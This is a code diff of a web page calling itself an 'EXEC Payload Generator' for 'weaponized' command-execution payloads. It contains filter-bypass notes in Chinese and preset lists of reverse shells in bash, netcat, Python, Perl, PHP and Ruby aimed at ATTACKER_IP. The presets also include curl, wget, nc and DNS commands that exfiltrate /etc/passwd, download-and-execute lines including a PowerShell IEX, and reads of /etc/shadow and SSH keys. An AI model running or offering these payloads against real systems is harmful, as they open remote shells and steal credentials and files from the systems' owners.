+nohup arr0w1_cmd_origin &
+═══════════════════════════════════════════════════════════════
+🔶 注释/终止符 (Comment/Terminator)
+═══════════════════════════════════════════════════════════════
+🔥[Shell] [Linux/macOS] # - 注释截断
+📌用途: 截断注入点后的内容
+📌原理: # 开始的内容被shell视为注释忽略
+📌示例: ping $input # suffix → 注入 127.0.0.1;id # 可忽略suffix
+📌用途: 移除原命令中的后续参数
+arr0w1_cmd_origin #
+🔥[Shell] [Linux/macOS] -- - 选项终止符
+📌用途: 防止后续内容被解析为选项
+📌原理: -- 后的所有内容都被视为参数而非选项
+📌示例: rm -- -rf (删除名为-rf的文件)
+📌用途: 确保注入的路径不被解析为选项
+arr0w1_cmd_origin --
+═══════════════════════════════════════════════════════════════
+🔷 Web/URL 专用 (Web-Specific Bypasses)
+═══════════════════════════════════════════════════════════════
+🔥[Web] [Linux/macOS/Windows] Tab (%09) - 制表符替换空格
+📌场景: HTTP请求、URL参数、Web表单
+📌绕过: 空格字符过滤
+📌原理: Tab字符(0x09)在shell中等同于空格
+📌示例: cat /etc/passwd → cat%09/etc/passwd
+📌注意: 需要URL编码, 直接在终端无效
+arr0w1_cmd_tab
+🔥[Web] [Linux/macOS/Windows] %0a - 换行符注入
+📌场景: HTTP请求、URL参数
+📌绕过: 命令注入过滤
+📌原理: %0a 是换行符(LF)的URL编码, 换行后开始新命令
+📌示例: ?cmd=whoami%0aid (先执行whoami, 再执行id)
+📌注意: 需要URL编码, 直接在终端无效
+arr0w1_cmd_origin%0a
+🔥[Web] [Linux/macOS/Windows] %5C%0A - 反斜杠换行续行
+📌场景: HTTP请求、URL参数
+📌绕过: 长命令检测、单行命令限制
+📌原理: %5C=反斜杠, %0A=换行, 组合表示命令续行
+📌示例: cat /etc/passwd → cat%5C%0A/etc/passwd
+📌注意: 需要URL编码, 直接在终端无效
+arr0w1_cmd_backslash_newline
 </textarea>
 
         <!-- ----------------- -->
 
         <main role="main">
             <section class="tool-header">
-                <h1>EXEC Payload Generator</h1>
-                <p>Generate weaponized Command Execution payloads.</p>
+                <h1 data-i18n="exec_title">EXEC Payload Generator</h1>
+                <p data-i18n="exec_desc">Generate weaponized Command Execution payloads.</p>
             </section>
 
             <div class="input-block">
-                <label for="your_cmd"><strong>The command you want to execute:</strong></label>
-                <input type="text" id="your_cmd" value="/bin/bash -i >& /dev/tcp/181614338/6666 0>&1"
-                    oninput="func_oninput()" autofocus
-                    onfocus="var temp_value=this.value; this.value=''; this.value=temp_value" />
+                <label for="your_cmd"><strong data-i18n="exec_input_label">The command you want to
+                        execute:</strong></label>
+                <div class="input-with-presets">
+                    <input type="text" id="your_cmd" value="/bin/bash -i >& /dev/tcp/127.0.0.1/4444 0>&1"
+                        oninput="func_oninput()" autofocus
+                        onfocus="var temp_value=this.value; this.value=''; this.value=temp_value" />
+                    <button class="preset-btn" onclick="togglePresetMenu()" title="Quick Commands">▼</button>
+                </div>
+                <!-- Preset Commands Dropdown -->
+                <div id="preset-menu" class="preset-menu" style="display: none;"></div>
+
+                <!-- Environment Selector (Multi-select) -->
+                <div class="env-selector">
+                    <span class="env-selector-label" data-i18n="exec_env_label">Target Environment / 目标环境 (可多选):</span>
+                    <div class="env-group">
+                        <span class="env-group-label">Runtime:</span>
+                        <span class="env-chip" data-env="java" onclick="toggleEnv('java')">Java</span>
+                        <span class="env-chip" data-env="nodejs" onclick="toggleEnv('nodejs')">Node.js</span>
+                        <span class="env-chip" data-env="shell" onclick="toggleEnv('shell')">Shell</span>
+                        <span class="env-chip" data-env="web" onclick="toggleEnv('web')">Web/URL</span>
+                    </div>
+                    <div class="env-divider"></div>
+                    <div class="env-group">
+                        <span class="env-group-label">OS:</span>
+                        <span class="env-chip" data-env="linux" onclick="toggleEnv('linux')">Linux</span>
+                        <span class="env-chip" data-env="macos" onclick="toggleEnv('macos')">macOS</span>
+                        <span class="env-chip" data-env="windows" onclick="toggleEnv('windows')">Windows</span>
+                    </div>
+                    <div class="env-divider"></div>
+                    <div class="env-group">
+                        <span class="env-chip active" data-env="all" onclick="toggleEnv('all')"
+                            style="background: var(--text-secondary); border-color: var(--text-secondary);">Reset /
+                            重置</span>
+                    </div>
+                </div>
             </div>
 
             <hr>
@@ -517,313 +1062,1231 @@ require('\x63hild_process').exec(Buffer.from('arr0w1_base64', 'base64').toString
                 <div class="hint-section">
                     <strong>Base Command</strong>
                     <div class="code-with-copy">
-                        <button class="copy-btn" onclick="copyPayload('payload0', this)" style="opacity: 0;">Copy</button>
+                        <button class="copy-btn" onclick="copyPayload('payload0', this)"
+                            style="opacity: 0;">Copy</button>
                         <pre class="hint-code"><code id="payload0"></code></pre>
                     </div>
                 </div>
             </div>
 
-                <div class="output-block" id="payload1-container">
+            <div class="output-block" id="payload1-container">
                 <h3>1 - Java (String[])</h3>
                 <p style="color: var(--text-secondary); font-size: 0.8rem; margin-bottom: 10px;">
                     java.lang.Runtime.getRuntime().exec​(String[] cmdarray)</p>
+                <div id="payload1-commands-display"></div>
             </div>
 
-                <div class="output-block" id="payload2-container">
+            <div class="output-block" id="payload2-container">
                 <h3>2 - Java (String)</h3>
                 <p style="color: var(--text-secondary); font-size: 0.8rem; margin-bottom: 10px;">
                     java.lang.Runtime.getRuntime().exec("command")</p>
+                <div id="payload2-commands-display"></div>
             </div>
 
-                <div class="output-block" id="payload3-container">
-                <h3>3 - Shell (Encoding)</h3>
-                <p style="color: var(--text-secondary); font-size: 0.8rem; margin-bottom: 10px;">Base64 / Hex / Obfuscation</p>
+            <div class="output-block" id="payload3-container">
+                <h3>3 - Shell Encoding</h3>
+                <p style="color: var(--text-secondary); font-size: 0.8rem; margin-bottom: 10px;">Base64 / Hex / Python /
+                    Perl</p>
+                <div id="payload3-commands-display"></div>
             </div>
 
-                <div class="output-block" id="payload4-container">
+            <div class="output-block" id="payload4-container">
                 <h3>4 - Node.js</h3>
-                <p style="color: var(--text-secondary); font-size: 0.8rem; margin-bottom: 10px;">child_process.exec()</p>
+                <p style="color: var(--text-secondary); font-size: 0.8rem; margin-bottom: 10px;">child_process.exec() /
+                    execSync / spawnSync</p>
+                <div id="payload4-commands-display"></div>
             </div>
 
-                <div class="output-block" id="payload5-container">
-                <h3>5 - Temp</h3>
+            <div class="output-block" id="payload5-container">
+                <h3>5 - PowerShell / cmd.exe</h3>
+                <p style="color: var(--text-secondary); font-size: 0.8rem; margin-bottom: 10px;">Windows command
+                    execution</p>
+                <div id="payload5-commands-display"></div>
             </div>
 
-                <div class="output-block" id="payload6-container">
-                <h3>6 - Temp</h3>
+            <div class="output-block" id="payload6-container">
+                <h3>6 - Filter Bypass Techniques</h3>
+                <p style="color: var(--text-secondary); font-size: 0.8rem; margin-bottom: 10px;">
+                    🔶 Shell: Command/Space/Slash/Encoding/Chaining &nbsp;|&nbsp;
+                    🔷 Web: URL Encoding (%09/%0a/%5C%0A)
+                </p>
+                <div id="payload6-commands-display"></div>
             </div>
 
         </main>
-    </div>
 
-    <!-- Hint Lightbulb -->
-    <div class="hint-lightbulb" onclick="toggleHint(event)" title="View Help"></div>
+        <!-- Standardized Footer -->
+        <footer class="unified-footer injected-footer">
+            <p>
+                <span>arr0w1 <span style="margin: 0 4px; opacity: 0.3;">|</span> <a href="https://github.com/1135"
+                        target="_blank" class="author-link"
+                        style="color: inherit; text-decoration: none; transition: color 0.2s;"
+                        onmouseover="this.style.color='var(--primary-color)'"
+                        onmouseout="this.style.color='inherit'">1135</a></span>
+                <span style="opacity: 0.2;">|</span>
+                <span class="footer-donation-icons">
+                    <a href="https://buymeacoffee.com/wi11x5" target="_blank" title="Buy me a coffee"
+                        class="donation-link">
+                        <img src="https://cdn.buymeacoffee.com/buttons/bmc-new-btn-logo.svg" alt="Buy me a coffee">
+                    </a>
+                    <a href="https://ko-fi.com/wi11x5" target="_blank" title="Ko-fi" class="donation-link">
+                        <img src="https://storage.ko-fi.com/cdn/cup-border.png" alt="Ko-fi">
+                    </a>
+                </span>
+            </p>
+        </footer>
 
-    <!-- Hint Modal -->
-    <div id="interactive-hint" class="interactive-hint"
-        style="position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; background: rgba(0,0,0,0.9); backdrop-filter: blur(5px); display: none; align-items: center; justify-content: center; z-index: 9999;">
-        <div class="hint-content"
-            style="background: var(--surface-color); padding: 40px; border-radius: 8px; border: 1px solid var(--primary-color); max-width: 600px; max-height: 80vh; overflow-y: auto;">
-            <h2 style="color: var(--primary-color); margin-bottom: 20px;">🔧 EXEC Payload Generator 使用说明</h2>
-            <p style="margin-bottom: 15px;">本工具帮助生成各种命令执行payload：</p>
-            <ul style="margin-bottom: 20px; padding-left: 20px;">
-                <li>支持多种编码格式（Unicode、Hex、Base64）</li>
-                <li>自动生成多种payload变体</li>
-                <li>一键复制到剪贴板</li>
-            </ul>
-            <button
-                style="width: 100%; padding: 12px; background: var(--primary-color); color: #000; border: none; cursor: pointer;"
-                onclick="toggleHint(event)">关闭</button>
+        <!-- Floating Buttons -->
+        <!-- Hint Lightbulb -->
+        <div class="hint-lightbulb" onclick="toggleHint(event)" title="View Help"></div>
+
+        <div id="back-to-top" title="Back to Top">
+            <svg viewBox="0 0 24 24">
+                <path d="M7.41 15.41L12 10.83l4.59 4.58L18 14l-6-6-6 6z"></path>
+            </svg>
         </div>
-    </div>
 
-    <footer>
-        <div class="container">
-            <p>arr0w1 | 1135</p>
-        </div>
-    </footer>
+        <!-- Scripts -->
+        <script src="../../js/main.js"></script>
+        <script>
+            // Navigation is already loaded, just ensure language is applied
+            if (typeof applyLanguage === 'function') {
+                applyLanguage(localStorage.getItem('lang') || 'zh');
+            }
 
-    <!-- Scripts -->
-    <script src="../../js/main.js"></script>
-    <script>
-        // Navigation is already loaded, just ensure language is applied
-                if (typeof applyLanguage === 'function') {
-                    applyLanguage(localStorage.getItem('lang') || 'zh');
+
+            // -----
+
+            // get elements - hiddened
+            element_data0 = document.getElementById("data0");
+            element_data1 = document.getElementById("data1");
+            element_data2 = document.getElementById("data2");
+            element_data3 = document.getElementById("data3");
+            element_data4 = document.getElementById("data4");
+            element_data5 = document.getElementById("data5");
+            element_data6 = document.getElementById("data6");
+
+            // get datas
+            var data0 = element_data0.value;
+            var data1 = element_data1.value;
+            var data2 = element_data2.value;
+            var data3 = element_data3.value;
+            var data4 = element_data4.value;
+            var data5 = element_data5.value;
+            var data6 = element_data6.value;
+
+            // -----
+
+            //textarea增高 随内容自动增加textarea的高度
+            function auto_grow(element) {
+                // No longer needed, using pre/code blocks
+            }
+
+            // Copy payload safely
+            function copyPayload(id, btnElement) {
+                const element = document.getElementById(id);
+                if (!element) {
+                    console.error(`Element with id "${id}" not found`);
+                    return;
                 }
-
-        // Toggle hint modal with click-outside-to-close
-        function toggleHint(event) {
-            if (event) event.stopPropagation();
-            const hint = document.getElementById('interactive-hint');
-            const isVisible = hint.style.display === 'flex';
-            hint.style.display = isVisible ? 'none' : 'flex';
-
-            // Add click listener to close on outside click
-            if (!isVisible) {
-                setTimeout(() => {
-                    document.addEventListener('click', closeHintOnOutsideClick);
-                }, 0);
-            } else {
-                document.removeEventListener('click', closeHintOnOutsideClick);
-            }
-        }
-
-        function closeHintOnOutsideClick(event) {
-            const hint = document.getElementById('interactive-hint');
-            const hintContent = hint.querySelector('.hint-content');
-
-            // Check if click is outside the hint content
-            if (!hintContent.contains(event.target)) {
-                hint.style.display = 'none';
-                document.removeEventListener('click', closeHintOnOutsideClick);
-            }
-        }
-
-        // -----
-
-        // get elements - hiddened
-        element_data0 = document.getElementById("data0");
-        element_data1 = document.getElementById("data1");
-        element_data2 = document.getElementById("data2");
-        element_data3 = document.getElementById("data3");
-        element_data4 = document.getElementById("data4");
-        element_data5 = document.getElementById("data5");
-        element_data6 = document.getElementById("data6");
-
-        // get datas
-        var data0 = element_data0.value;
-        var data1 = element_data1.value;
-        var data2 = element_data2.value;
-        var data3 = element_data3.value;
-        var data4 = element_data4.value;
-        var data5 = element_data5.value;
-        var data6 = element_data6.value;
-
-        // -----
-
-        //textarea增高 随内容自动增加textarea的高度
-        function auto_grow(element) {
-            // No longer needed, using pre/code blocks
-        }
-
-        // Copy payload safely
-        function copyPayload(id, btnElement) {
-            const element = document.getElementById(id);
-            if (!element) {
-                console.error(`Element with id "${id}" not found`);
-                return;
-            }
-            const text = element.textContent;
-            navigator.clipboard.writeText(text).then(() => {
-                // Visual feedback
-                if (btnElement) {
-                    const originalText = btnElement.textContent;
-                    btnElement.textContent = 'Copied!';
-                setTimeout(() => {
-                        btnElement.textContent = originalText;
-                }, 1500);
-                }
-            }).catch(err => {
-                console.error('Failed to copy:', err);
-            });
-        }
-
-        // Make copyPayload available globally for onclick handlers
-        window.copyPayload = copyPayload;
-
-        // -----
-
-
-        function ascii_2_Hex(str) {
-            var re = /[\u4E00-\u9FA5]/;
-            var ar = [];
-            for (var i = 0; i < str.length; i++) {
-                var a = '';
-                if (re.test(str.charAt(i))) { // 中文
-                    a = encodeURI(str.charAt(i)).replace(/%/g, '');
-                } else {
-                    a = "\\x" + str.charCodeAt(i).toString(16);
-                }
-                ar.push(a);
-            }
-            str = ar.join("");
-            return str;
-        }
-
-        function ascii_2_Hex_without_black_chars(str) {
-            var regex_black_chars = /([<>|&;])/g;
-            var str_array = str.split(regex_black_chars);
-            // 排除 black_chars 如果命令里有这些字符,hex编码后的命令无法执行!
-
-            var allstr = "";
-            str_array.forEach(
-                function (one) {
-                    if (one.match(regex_black_chars) && one != "") {
-                        one = one.replace(regex_black_chars, "\"`$&`echo -e \""); // $& 是被匹配的字符串本身
-                    } else {
-                        one = ascii_2_Hex(one);
+                const text = element.textContent;
+                navigator.clipboard.writeText(text).then(() => {
+                    // Visual feedback
+                    if (btnElement) {
+                        const originalText = btnElement.textContent;
+                        btnElement.textContent = 'Copied!';
+                        setTimeout(() => {
+                            btnElement.textContent = originalText;
+                        }, 1500);
                     }
-                    allstr += one;
-                }
-            );
-
-            return allstr.replace(/`echo -e ""`/g, "").replace(/`echo -e "\x20"`/g, " "); // 去除无意义的字符
-        }
-
-        // 生成不带=的base64字符串
-        function func_wise_btoa(str1) {
-            //原理:在原始js语句后加空格 直到生成的base64字符串没有空格
-            while (1) {
-                if (btoa(str1).indexOf("=") == -1) {//  等号不存在
-                    return btoa(str1);
-                } else {
-                    str1 = str1 + " ";
-                }
-
-            }
-        }
-
-        // Function to display payload with multiple commands, each with its own copy button
-        function displayPayloadWithCommands(payloadId, payloadData) {
-            const container = document.getElementById(payloadId + '-container');
-            if (!container) return;
-
-            // Remove old content
-            const oldCodeWrapper = container.querySelector('.code-with-copy');
-            if (oldCodeWrapper) oldCodeWrapper.remove();
-            
-            const codeWrapper = document.createElement('div');
-            codeWrapper.className = 'code-with-copy';
-
-            // Split by lines
-            const lines = payloadData.split('\n').map(line => line.trim()).filter(line => line.length > 0);
-            
-            // Find command lines (lines starting with 🔥 or containing actual commands)
-            const commandLines = [];
-            
-            lines.forEach((line, index) => {
-                // Check if this is a command line - more comprehensive detection
-                const isCommand = line.startsWith('🔥') || 
-                                 (line.length > 5 && 
-                                  (line.includes('exec(') || 
-                                   line.includes('Runtime') || 
-                                   line.includes('/bin/') || 
-                                   line.includes('require(') ||
-                                   line.includes('perl') ||
-                                   line.includes('bash') ||
-                                   line.includes('echo') ||
-                                   line.includes('sh -c') ||
-                                   line.includes('cmd.exe') ||
-                                   line.includes('powershell') ||
-                                   line.startsWith('`') ||
-                                   line.startsWith('$') ||
-                                   line.startsWith('(') ||
-                                   line.includes('arr0w1_') ||
-                                   line.match(/^[a-zA-Z_][a-zA-Z0-9_]*\s*\(/))); // Function calls
-                
-                if (isCommand) {
-                    // Extract command (remove 🔥 prefix and description)
-                    let command = line;
-                    let label = `Command ${commandLines.length + 1}`;
-                    
-                    if (line.startsWith('🔥')) {
-                        // Extract label and command
-                        const parts = line.split(/🔥/);
-                        if (parts.length > 1) {
-                            const afterFire = parts.slice(1).join('🔥');
-                            // Try to extract label before the command
-                            const labelMatch = afterFire.match(/^([^：:]+)[：:]/);
-                            if (labelMatch) {
-                                label = labelMatch[1].trim();
-                                command = afterFire.substring(labelMatch[0].length).trim();
-                            } else {
-                                // Check if there's a description in brackets
-                                const bracketMatch = afterFire.match(/^([^【]+)【/);
-                                if (bracketMatch) {
-                                    label = bracketMatch[1].trim();
-                                    command = afterFire.substring(bracketMatch[0].length).trim();
-                                } else {
-                                    command = afterFire;
-                                }
-                            }
-                        }
-                    }
-                    
-                    commandLines.push({ command: command.trim(), label: label });
-                }
-            });
-            
-            // If no commands detected, treat each non-empty line as a potential command
-            if (commandLines.length === 0 && lines.length > 0) {
-                lines.forEach((line, index) => {
-                    if (line.length > 0) {
-                        commandLines.push({ 
-                            command: line, 
-                            label: `Line ${index + 1}` 
-                        });
-                    }
+                }).catch(err => {
+                    console.error('Failed to copy:', err);
                 });
             }
 
-            if (commandLines.length > 1) {
-                // Display as multiple hint-sections
-                commandLines.forEach((item, index) => {
+            // Make copyPayload available globally for onclick handlers
+            window.copyPayload = copyPayload;
+
+            // -----
+            // Preset Commands Data & Functions
+            const PRESET_COMMANDS = {
+                'Test Commands (Complex)': [
+                    { name: '🧪 netstat + grep + awk + sort + uniq', cmd: `netstat -an | grep ESTABLISHED | awk '{print $5}' | awk -F: '{print $1}' | sort | uniq -c | sort -nr` },
+                    { name: '🧪 find + xargs + grep', cmd: `find /etc -type f -name "*.conf" 2>/dev/null | xargs grep -l "password" 2>/dev/null` },
+                    { name: '🧪 ps + awk + sort', cmd: `ps aux | awk '{print $1, $2, $11}' | sort -k1` },
+                    { name: '🧪 cat + base64 + curl', cmd: `cat /etc/passwd | base64 -w0 | curl -A "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36" -X POST -d @- http://ATTACKER_IP:8000/` },
+                    { name: '🧪 ls + while + echo', cmd: `ls -la /tmp | while read line; do echo "[FILE] $line"; done` },
+                    { name: '🧪 for loop + ping', cmd: `for i in $(seq 1 254); do ping -c1 -W1 192.168.1.$i | grep "64 bytes" & done` }
+                ],
+                'Reverse Shell': [
+                    { name: 'Bash TCP Reverse Shell', cmd: `/bin/bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1` },
+                    { name: 'Bash -c Reverse Shell', cmd: `bash -c "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1"` },
+                    { name: 'Netcat -e Reverse Shell', cmd: `nc -e /bin/sh ATTACKER_IP 4444` },
+                    { name: 'Netcat mkfifo', cmd: `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ATTACKER_IP 4444 >/tmp/f` },
+                    { name: 'Python Reverse Shell', cmd: `python -c 'import socket,subprocess,os;s=socket.socket();s.connect(("ATTACKER_IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'` },
+                    { name: 'Perl Reverse Shell', cmd: `perl -e 'use Socket;$i="ATTACKER_IP";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");'` },
+                    { name: 'PHP Reverse Shell', cmd: `php -r '$sock=fsockopen("ATTACKER_IP",4444);exec("/bin/sh -i <&3 >&3 2>&3");'` },
+                    { name: 'Ruby Reverse Shell', cmd: `ruby -rsocket -e 'f=TCPSocket.open("ATTACKER_IP",4444).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'` }
+                ],
+                'Information Gathering': [
+                    { name: 'Basic Info', cmd: `id && whoami && hostname` },
+                    { name: 'Read /etc/passwd', cmd: `cat /etc/passwd` },
+                    { name: 'Read /etc/shadow', cmd: `cat /etc/shadow` },
+                    { name: 'OS Information', cmd: `uname -a && cat /etc/os-release` },
+                    { name: 'Environment Variables', cmd: `env && printenv` },
+                    { name: 'Process List', cmd: `ps aux` },
+                    { name: 'Crontab', cmd: `crontab -l && cat /etc/crontab` },
+                    { name: 'SSH Keys', cmd: `cat ~/.ssh/id_rsa && cat ~/.ssh/authorized_keys` }
+                ],
+                'Network': [
+                    { name: 'Active Connections (sorted)', cmd: `netstat -an | grep ESTABLISHED | awk '{print $5}' | awk -F: '{print $1}' | sort | uniq -c | sort -nr` },
+                    { name: 'Listening Ports', cmd: `netstat -tulpn` },
+                    { name: 'Socket Statistics', cmd: `ss -tulpn` },
+                    { name: 'Network Interfaces', cmd: `ifconfig -a || ip addr` },
+                    { name: 'ARP Table', cmd: `arp -a` },
+                    { name: 'External IP', cmd: `curl -A "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36" ifconfig.me` },
+                    { name: 'DNS Servers', cmd: `cat /etc/resolv.conf` },
+                    { name: 'Routing Table', cmd: `route -n || ip route` },
+                    { name: 'Firewall Rules', cmd: `iptables -L -n || ufw status` }
+                ],
+                'HTTP Requests (curl/wget)': [
+                    { name: '🌐 curl GET (简单)', cmd: `curl -A "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36" https://example.webhook.cool/` },
+                    { name: '🌐 curl GET -k -v (忽略SSL+详细)', cmd: `curl -A "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36" -k -v https://example.webhook.cool/` },
+                    { name: '🌐 curl GET 带Header', cmd: `curl -H "User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36" -H "Cookie: session=abc123" https://example.webhook.cool/` },
+                    { name: '🌐 curl POST (form data)', cmd: `curl -A "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36" -X POST -d "username=admin&password=123456" https://example.webhook.cool/login` },
+                    { name: '🌐 curl POST (JSON)', cmd: `curl -A "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36" -X POST -H "Content-Type: application/json" -d '{"user":"admin","pass":"123"}' https://example.webhook.cool/api` },
+                    { name: '🌐 curl POST 文件内容', cmd: `curl -A "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36" -X POST -d @/etc/passwd https://example.webhook.cool/exfil` },
+                    { name: '🌐 curl POST base64编码', cmd: `curl -A "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36" -X POST -d "data=$(cat /etc/passwd | base64 -w0)" https://example.webhook.cool/exfil` },
+                    { name: '🌐 curl -k POST (忽略SSL)', cmd: `curl -A "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36" -k -X POST -d "data=test" https://example.webhook.cool/` },
+                    { name: '🌐 wget GET (保存文件)', cmd: `wget -U "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36" https://example.webhook.cool/malware.sh -O /tmp/payload.sh` },
+                    { name: '🌐 wget GET (输出到stdout)', cmd: `wget -U "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36" -qO- https://example.webhook.cool/` },
+                    { name: '🌐 wget --no-check-certificate', cmd: `wget -U "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36" --no-check-certificate https://example.webhook.cool/` },
+                    { name: '🌐 wget POST', cmd: `wget -U "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36" --post-data="user=admin&pass=123" https://example.webhook.cool/login` },
+                    { name: '🌐 curl 下载执行', cmd: `curl -A "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36" https://ATTACKER_IP/shell.sh | bash` },
+                    { name: '🌐 wget 下载执行', cmd: `wget -U "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36" -qO- https://ATTACKER_IP/shell.sh | bash` }
+                ],
+                'File Operations': [
+                    { name: 'Find SUID Files', cmd: `find / -perm -4000 2>/dev/null` },
+                    { name: 'Find SGID Files', cmd: `find / -perm -2000 2>/dev/null` },
+                    { name: 'Find Writable Dirs', cmd: `find / -writable -type d 2>/dev/null` },
+                    { name: 'Find World Writable', cmd: `find / -perm -o+w -type f 2>/dev/null` },
+                    { name: 'List Temp Dirs', cmd: `ls -la /tmp /var/tmp /dev/shm` },
+                    { name: 'Bash History', cmd: `cat ~/.bash_history` },
+                    { name: 'Find Config Files', cmd: `find /etc -name "*.conf" 2>/dev/null | head -20` },
+                    { name: 'Find Log Files', cmd: `find /var/log -type f 2>/dev/null | head -20` }
+                ],
+                'Data Exfiltration': [
+                    { name: 'Curl POST File', cmd: `curl -A "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36" -X POST -d @/etc/passwd http://ATTACKER_IP:8000/` },
+                    { name: 'Wget POST File', cmd: `wget -U "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36" --post-file=/etc/passwd http://ATTACKER_IP:8000/` },
+                    { name: 'Base64 + Curl', cmd: `cat /etc/passwd | base64 | curl -A "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36" -d @- http://ATTACKER_IP:8000/` },
+                    { name: 'NC File Transfer', cmd: `cat /etc/passwd | nc ATTACKER_IP 4444` },
+                    { name: 'DNS Exfil (base64)', cmd: `cat /etc/passwd | base64 | tr -d "\\n" | xargs -I {} dig {}.ATTACKER_DOMAIN` }
+                ],
+                'Privilege Escalation': [
+                    { name: 'Sudo -l', cmd: `sudo -l` },
+                    { name: 'Check Capabilities', cmd: `getcap -r / 2>/dev/null` },
+                    { name: 'Check /etc/sudoers', cmd: `cat /etc/sudoers 2>/dev/null` },
+                    { name: 'Find Passwords', cmd: `grep -r "password" /etc 2>/dev/null | head -20` },
+                    { name: 'Check Docker', cmd: `docker ps && docker images` },
+                    { name: 'Check LXC', cmd: `lxc list` }
+                ],
+                'Windows': [
+                    { name: 'whoami /all', cmd: `whoami /all` },
+                    { name: 'System Info', cmd: `systeminfo` },
+                    { name: 'List Users', cmd: `net user` },
+                    { name: 'Network Connections', cmd: `netstat -ano` },
+                    { name: 'PowerShell Download', cmd: `powershell -c "IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/shell.ps1')"` },
+                    { name: 'PowerShell Encoded', cmd: `powershell -EncodedCommand BASE64_PAYLOAD` },
+                    { name: 'WMIC Process', cmd: `wmic process list brief` },
+                    { name: 'Scheduled Tasks', cmd: `schtasks /query /fo LIST /v` }
+                ]
+            };
+
+            // Flatten commands into indexed array for reliable access
+            const PRESET_COMMANDS_FLAT = [];
+            (function () {
+                for (const [category, commands] of Object.entries(PRESET_COMMANDS)) {
+                    for (const item of commands) {
+                        PRESET_COMMANDS_FLAT.push({ category, name: item.name, cmd: item.cmd });
+                    }
+                }
+            })();
+
+            function buildPresetMenu() {
+                const menu = document.getElementById('preset-menu');
+                if (!menu) return;
+
+                // Group by category for display
+                const categories = {};
+                PRESET_COMMANDS_FLAT.forEach((item, idx) => {
+                    if (!categories[item.category]) {
+                        categories[item.category] = [];
+                    }
+                    categories[item.category].push({ ...item, idx });
+                });
+
+                // Build menu using DOM methods (safer than innerHTML for special chars)
+                menu.innerHTML = '';
+                for (const [category, items] of Object.entries(categories)) {
+                    const categoryDiv = document.createElement('div');
+                    categoryDiv.className = 'preset-category';
+
+                    const strong = document.createElement('strong');
+                    strong.textContent = category;
+                    categoryDiv.appendChild(strong);
+
+                    for (const item of items) {
+                        const itemDiv = document.createElement('div');
+                        itemDiv.className = 'preset-item';
+                        itemDiv.textContent = item.name;
+                        itemDiv.dataset.idx = item.idx;
+
+                        // Use closure to capture the correct index
+                        itemDiv.addEventListener('click', (function (index) {
+                            return function () {
+                                selectPresetByIndex(index);
+                            };
+                        })(item.idx));
+
+                        categoryDiv.appendChild(itemDiv);
+                    }
+
+                    menu.appendChild(categoryDiv);
+                }
+            }
+
+            function selectPresetByIndex(idx) {
+                const item = PRESET_COMMANDS_FLAT[idx];
+                if (item) {
+                    selectPreset(item.cmd);
+                }
+            }
+
+            function togglePresetMenu() {
+                const menu = document.getElementById('preset-menu');
+                if (menu.style.display === 'none') {
+                    menu.style.display = 'block';
+                } else {
+                    menu.style.display = 'none';
+                }
+            }
+
+            function selectPreset(cmd) {
+                const input = document.getElementById('your_cmd');
+                input.value = cmd;
+                document.getElementById('preset-menu').style.display = 'none';
+                func_oninput();
+                input.focus();
+            }
+
+            // Close preset menu when clicking outside
+            document.addEventListener('click', function (e) {
+                const menu = document.getElementById('preset-menu');
+                const btn = document.querySelector('.preset-btn');
+                if (menu && btn && !menu.contains(e.target) && !btn.contains(e.target)) {
+                    menu.style.display = 'none';
+                }
+            });
+
+            // Build preset menu on load
+            document.addEventListener('DOMContentLoaded', buildPresetMenu);
+
+            // Make functions available globally
